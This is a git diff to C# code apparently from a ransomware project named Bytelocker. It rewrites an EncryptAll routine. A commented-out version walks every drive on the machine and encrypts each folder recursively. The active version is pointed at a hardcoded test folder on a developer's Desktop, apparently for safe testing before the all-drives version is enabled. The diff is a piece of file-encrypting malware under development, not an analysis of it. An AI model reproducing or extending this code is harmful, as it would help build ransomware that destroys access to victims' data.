@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.IO;
 
 namespace Bytelocker.CryptoManager
 {
@@ -35,16 +36,32 @@ namespace Bytelocker.CryptoManager
                 dfm.DecryptDir();
             }
         }
-        public void EncryptAll(String starting_path)
+        /*
+        public void EncryptAll()
         {
             DirManager dfm = new DirManager();
 
-            List<String> dirs = DirManager.GetFoldersRecursive(starting_path);
-            foreach (String subDir in dirs)
+            foreach (DriveInfo drive in DriveInfo.GetDrives())
             {
+                List<String> dirs = DirManager.GetFoldersRecursive(drive.ToString());
+                foreach (String subDir in dirs)
+                {
+                    dfm.ChooseDir(subDir);
+                    dfm.EncryptDir();
+                }
+            }
+        }
+        */
+
+        public void EncryptAll()
+        {
+            DirManager dfm = new DirManager();
+            List<String> dirs = DirManager.GetFoldersRecursive(@"C:\Users\nic\Desktop\New folder");
+            foreach (String subDir in dirs)
+                {
                 dfm.ChooseDir(subDir);
                 dfm.EncryptDir();
-            }
+                }
         }
 
         public List<String> FilesEncryptedList()
